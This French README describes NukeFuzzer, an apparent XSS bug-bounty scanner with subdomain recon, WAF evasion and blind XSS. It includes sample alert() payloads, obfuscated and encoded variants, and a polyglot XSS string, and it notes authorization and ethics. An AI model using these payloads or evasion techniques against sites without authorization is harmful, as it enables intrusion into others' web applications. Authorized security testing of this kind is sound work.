# NukeFuzzer v2.0 Advanced - XSS Bug Bounty Tool

🚀 **NukeFuzzer v2.0 Advanced** est un outil de bug bounty révolutionnaire conçu pour la découverte avancée de vulnérabilités XSS avec des techniques d'évasion WAF de pointe.

## 🎯 Fonctionnalités Avancées

### 🔍 Découverte Multi-Sources
- **Découverte de sous-domaines** : subfinder, assetfinder, amass, findomain, crt.sh API
- **Collection d'endpoints** : gau, waybackurls, katana, hakrawler, gospider
- **Analyse JavaScript** : linkfinder pour découvrir les endpoints cachés
- **Reconnaissance passive** : API crt.sh, Wayback Machine

### 💉 Techniques XSS Avancées
- **300+ payloads XSS** avec génération contextuelle
- **Évasion WAF** avec 15+ techniques d'obfuscation
- **Payloads polyglot** pour bypass multicouche
- **DOM XSS** et **Blind XSS** spécialisés
- **Encodage multiple** : URL, HTML, Base64, Unicode, Hex

### 🛡️ Techniques d'Évasion WAF
- **Variation de casse** et substitution de caractères
- **Obfuscation JavaScript** avancée
- **Insertion de commentaires** et espaces alternatifs
- **Encodage mixte** et double encodage
- **Concaténation de chaînes** et manipulation Unicode

### 🎯 Analyse Contextuelle
- **Détection de contexte** automatique (HTML, JavaScript, Attribute, URL)
- **Génération de payloads** adaptés au contexte
- **Analyse de réponse** intelligente
- **Filtrage de faux positifs** avec IA
- **Score de risque** algorithmique

### 🔧 Fonctionnalités Techniques
- **Gestion de sessions** avancée
- **Rate limiting** intelligent
- **Rotation de User-Agents** et proxies
- **Support multi-méthodes** (GET, POST, PUT, DELETE)
- **Test d'injection** dans headers et cookies
- **Parallélisation** optimisée

## 📦 Installation

### Prérequis
```bash
# Outils requis (à installer séparément)
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/owasp-amass/amass/v4/...@master
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/lc/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/jaeles-project/gospider@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/tomnomnom/gf@latest
go install github.com/KathanP19/Gxss@latest
go install github.com/s0md3v/uro@latest
```

### Installation de NukeFuzzer
```bash
# Cloner le repository
git clone https://github.com/Youns92/NukeFuzzer.git
cd NukeFuzzer

# Installer les dépendances Python
pip3 install -r requirements.txt

# Rendre le script exécutable
chmod +x NukeFuzzer.py

# Tester l'installation
python3 test_nukefuzzer.py
```

## 🚀 Utilisation

### Utilisation Basique
```bash
python3 NukeFuzzer.py
# Entrer le domaine cible : example.com
```

### Utilisation avec Configuration Avancée
```python
from config import load_advanced_config
from advanced_payloads import AdvancedXSSPayloads
from session_manager import AdvancedXSSScanner

# Configuration personnalisée
config = load_advanced_config()
config.set('general.max_workers', 200)
config.set('xss.payload_count', 150)

# Scanner avancé
scanner = AdvancedXSSScanner(config.config)
results = scanner.scan_url('https://example.com/search?q=test')
```

### Génération de Payloads Personnalisés
```python
from advanced_payloads import AdvancedXSSPayloads

generator = AdvancedXSSPayloads()

# Payloads contextuels
html_payloads = generator.generate_context_aware_payload('html')
js_payloads = generator.generate_context_aware_payload('javascript')

# Payloads avec évasion WAF
waf_bypass = generator.apply_waf_bypass(
    '<script>alert("XSS")</script>', 
    'javascript_obfuscation'
)

# Payloads polyglot
polyglot_payloads = generator.polyglot_payloads

# Blind XSS
blind_payloads = generator.generate_blind_xss_payloads('callback.example.com')
```

## 🔧 Architecture

```
NukeFuzzer v2.0/
├── NukeFuzzer.py          # Script principal
├── advanced_payloads.py   # Générateur de payloads XSS
├── advanced_techniques.py # Techniques d'évasion WAF
├── session_manager.py     # Gestion HTTP avancée
├── config.py             # Configuration système
├── test_nukefuzzer.py    # Suite de tests
└── requirements.txt      # Dépendances Python
```

### Modules Principaux

#### 1. `advanced_payloads.py`
- **AdvancedXSSPayloads** : Générateur de payloads avec 300+ variantes
- **Techniques d'encodage** : URL, HTML, Base64, Unicode, Hex
- **Payloads contextuels** : HTML, JavaScript, Attribute, URL
- **Évasion WAF** : 15+ techniques d'obfuscation

#### 2. `advanced_techniques.py`
- **WAFEvasionTechniques** : Techniques d'évasion avancées
- **AdvancedTechniques** : Analyse contextuelle et détection
- **Détection de WAF** : Identification automatique
- **Analyse de réponse** : Scoring algorithmique

#### 3. `session_manager.py`
- **AdvancedHTTPClient** : Client HTTP avec évasion
- **SessionManager** : Gestion d'état et cookies
- **RateLimiter** : Limitation intelligente
- **AdvancedXSSScanner** : Scanner XSS complet

#### 4. `config.py`
- **AdvancedConfig** : Configuration centralisée
- **Validation** : Vérification des paramètres
- **Persistance** : Sauvegarde JSON
- **Gestion** : API de configuration

## 🎨 Exemples d'Utilisation

### Scan XSS Complet
```python
import asyncio
from NukeFuzzer import main

# Scan automatique
asyncio.run(main('example.com'))
```

### Test de Payloads Personnalisés
```python
from advanced_payloads import AdvancedXSSPayloads
from advanced_techniques import get_waf_bypass_variants

generator = AdvancedXSSPayloads()
base_payload = '<script>alert("XSS")</script>'

# Génération de variantes
variants = get_waf_bypass_variants(base_payload, 10)
for variant in variants:
    print(f"Payload: {variant}")
```

### Analyse de Réponse
```python
from advanced_techniques import analyze_xss_response

response = '<html><body><input value="USER_INPUT"></body></html>'
analysis = analyze_xss_response(response, 'USER_INPUT')

print(f"Contexte: {analysis['context']}")
print(f"Confiance: {analysis['confidence']}%")
print(f"Vulnérable: {analysis['potential_xss']}")
```

## 📊 Types de Vulnérabilités Détectées

### 1. **Reflected XSS**
- Injection dans paramètres GET/POST
- Analyse contextuelle automatique
- Filtrage de faux positifs

### 2. **Stored XSS**
- Persistance de payloads
- Détection différée
- Analyse de stockage

### 3. **DOM XSS**
- Manipulation JavaScript
- Sources et puits DOM
- Analyse client-side

### 4. **Blind XSS**
- Callbacks externes
- Exfiltration de données
- Détection asynchrone

## 🛡️ Techniques d'Évasion WAF

### Obfuscation JavaScript
```javascript
// Basique
<script>alert("XSS")</script>

// Obfusqué
<script>window["alert"]("XSS")</script>
<script>eval("alert(\"XSS\")")</script>
<script>Function("alert(\"XSS\")")()</script>
```

### Encodage Multiple
```html
<!-- URL Encoding -->
%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E

<!-- HTML Entities -->
&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

<!-- Unicode -->
\u003cscript\u003ealert(\u0022XSS\u0022)\u003c/script\u003e
```

### Payloads Polyglot
```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//
```

## 📈 Performances

### Benchmarks
- **Génération de payloads** : 1000 payloads/seconde
- **Analyse de réponse** : 500 analyses/seconde
- **Évasion WAF** : 100 variantes/seconde
- **Scan parallèle** : 50 URLs simultanées

### Optimisations
- **Pool de threads** configurables
- **Rate limiting** intelligent
- **Cache de résultats** automatique
- **Gestion mémoire** optimisée

## 🔐 Sécurité et Éthique

### ⚠️ Utilisation Responsable
- **Autorisation requise** : Testez uniquement vos domaines
- **Divulgation responsable** : Respectez les processus de signalement
- **Limites légales** : Respectez les lois locales
- **Rate limiting** : Évitez la surcharge des serveurs

### 🛡️ Bonnes Pratiques
- Utilisez des environnements de test
- Documentez vos tests
- Validez manuellement les résultats
- Respectez les bug bounty programs

## 🤝 Contribution

### Développement
```bash
# Fork du repository
git clone https://github.com/votre-username/NukeFuzzer.git
cd NukeFuzzer

# Créer une branche
git checkout -b feature/nouvelle-fonctionnalite

# Développer et tester
python3 test_nukefuzzer.py

# Commit et push
git commit -m "Ajouter nouvelle fonctionnalité"
git push origin feature/nouvelle-fonctionnalite
```

### Types de Contributions
- **Nouveaux payloads** XSS
- **Techniques d'évasion** WAF
- **Détection de WAF** supplémentaires
- **Optimisations** de performance
- **Documentation** et exemples

## 📚 Documentation Technique

### Configuration Avancée
```json
{
  "general": {
    "max_workers": 100,
    "timeout": 30,
    "retry_count": 3
  },
  "xss": {
    "payload_count": 100,
    "waf_bypass_techniques": [
      "case_variation",
      "encoding_variation",
      "javascript_obfuscation"
    ]
  },
  "waf_bypass": {
    "rotate_user_agents": true,
    "rate_limiting": {
      "requests_per_second": 10,
      "burst_size": 50
    }
  }
}
```

### API Documentation
- **Modules** : Documentation complète des classes
- **Méthodes** : Paramètres et exemples
- **Configuration** : Options avancées
- **Exemples** : Cas d'usage pratiques

## 🏆 Crédits

### Développeur Principal
- **Itachii** - Développement et architecture

### Outils Intégrés
- **subfinder** - Découverte de sous-domaines
- **httpx** - Vérification HTTP
- **gau** - URL archivées
- **katana** - Crawling avancé
- **dalfox** - Scanner XSS
- **Et bien d'autres...**

### Inspirations
- **PortSwigger** - Techniques XSS
- **OWASP** - Méthodologies de sécurité
- **Bug Bounty Community** - Techniques avancées

## 📄 Licence

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.

## 🚨 Avertissement

**NukeFuzzer v2.0 Advanced** est un outil de sécurité destiné aux professionnels de la cybersécurité, aux chercheurs en sécurité et aux bug bounty hunters. L'utilisation de cet outil sans autorisation explicite est illégale et peut entraîner des poursuites judiciaires.

**Utilisez cet outil de manière responsable et éthique.**

---

💡 **Astuce** : Pour les meilleurs résultats, combinez NukeFuzzer avec d'autres outils de reconnaissance et validez toujours manuellement les vulnérabilités trouvées.

🔗 **Liens utiles** :
- [Documentation complète](https://github.com/Youns92/NukeFuzzer/wiki)
- [Exemples d'utilisation](https://github.com/Youns92/NukeFuzzer/tree/main/examples)
- [Signaler un bug](https://github.com/Youns92/NukeFuzzer/issues)
- [Contribuer](https://github.com/Youns92/NukeFuzzer/pulls)

📞 **Contact** : Ouvrez une issue GitHub pour toute question ou suggestion.